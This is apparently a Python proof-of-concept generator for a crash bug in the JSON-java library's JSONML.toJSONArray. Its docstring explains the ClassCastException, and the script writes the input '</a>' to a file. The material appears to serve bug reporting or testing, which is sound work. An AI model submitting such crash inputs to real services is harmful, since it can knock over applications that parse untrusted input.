#!/usr/bin/env python3
"""Generate PoC for jsonjava-jsonml-classcast.

JSONML.parse() returns whatever its inner switch yields. When the very
first XML token is a closing tag "</NAME>", `parse()` returns the
String "NAME" (the close-tag name). The public toJSONArray() then casts
this String to JSONArray:

    return (JSONArray) parse(new XMLTokener(string), true, null, ...);

→ ClassCastException at JSONML.toJSONArray.
"""

def create_poc(output='poc.bin'):
    # "</a>" is enough: parse() returns the String "a", outer cast fails.
    blob = b'</a>'
    with open(output, 'wb') as f:
        f.write(blob)
    print(f"wrote {output} ({len(blob)} bytes)")


if __name__ == '__main__':
    create_poc()
